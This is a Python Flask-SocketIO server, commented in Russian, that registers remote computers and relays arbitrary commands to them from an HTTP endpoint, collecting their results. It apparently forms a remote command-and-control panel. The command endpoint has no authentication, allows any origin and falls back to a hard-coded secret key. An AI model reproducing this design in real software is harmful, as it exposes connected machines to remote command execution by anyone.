# ==============================================
# ЭТО ДОЛЖНО БЫТЬ В САМОМ НАЧАЛЕ ФАЙЛА!
# ==============================================
import eventlet
eventlet.monkey_patch()  # ДОЛЖНО БЫТЬ ПЕРВЫМ!
# ==============================================

from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import sqlite3
import json
from datetime import datetime
import uuid
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'kaka-secret-key')
socketio = SocketIO(app, cors_allowed_origins="*", ping_timeout=30, ping_interval=10)

# База данных
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS computers
                 (id TEXT PRIMARY KEY,
                  name TEXT,
                  last_seen TIMESTAMP,
                  status TEXT,
                  sid TEXT)''')
    conn.commit()
    conn.close()

init_db()

# Веб-интерфейс
@app.route('/')
def index():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    computers = c.execute("SELECT id, name, last_seen, status FROM computers ORDER BY last_seen DESC").fetchall()
    conn.close()
    return render_template('index.html', computers=computers)

# REST API для отправки команд
@app.route('/api/send_command', methods=['POST'])
def api_send_command():
    computer_id = request.form.get('computer_id')
    command = request.form.get('command')
    
    if not computer_id or not command:
        return jsonify({'status': 'error', 'message': 'Missing parameters'})
    
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    result = c.execute("SELECT sid FROM computers WHERE id=?", (computer_id,)).fetchone()
    conn.close()
    
    if result and result[0]:
        socketio.emit('command', {'command': command}, room=result[0])
        print(f"📨 Команда отправлена {computer_id}: {command}")
        return jsonify({'status': 'queued', 'message': 'Command sent'})
    else:
        return jsonify({'status': 'error', 'message': 'Computer offline'})

# WebSocket: регистрация компьютера
@socketio.on('register')
def handle_register(data):
    computer_name = data.get('name', 'Unknown')
    computer_id = str(uuid.uuid4())[:8]
    
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO computers (id, name, last_seen, status, sid) VALUES (?, ?, ?, ?, ?)",
              (computer_id, computer_name, datetime.now(), 'online', request.sid))
    conn.commit()
    conn.close()
    
    print(f"✅ Компьютер зарегистрирован: {computer_name} (ID: {computer_id})")
    emit('registered', {'computer_id': computer_id})

# WebSocket: результат от компьютера
@socketio.on('command_result')
def handle_command_result(data):
    print(f"📊 ПОЛУЧЕН РЕЗУЛЬТАТ ОТ {data.get('computer_id')}: {data.get('command')}")
    
    computer_id = data['computer_id']
    command = data['command']
    result = data['result']
    
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("UPDATE computers SET last_seen=?, status='online' WHERE id=?", 
              (datetime.now(), computer_id))
    conn.commit()
    conn.close()
    
    socketio.emit('command_done', {
        'computer_id': computer_id,
        'command': command,
        'result': result
    })
    print(f"✅ Результат отправлен в браузер")

# WebSocket: отключение компьютера
@socketio.on('disconnect')
def handle_disconnect():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("UPDATE computers SET status='offline' WHERE sid=?", (request.sid,))
    conn.commit()
    conn.close()
    print(f"🔌 Компьютер отключен (SID: {request.sid})")

if __name__ == '__main__':
    socketio.run(app, debug=True, port=5000)
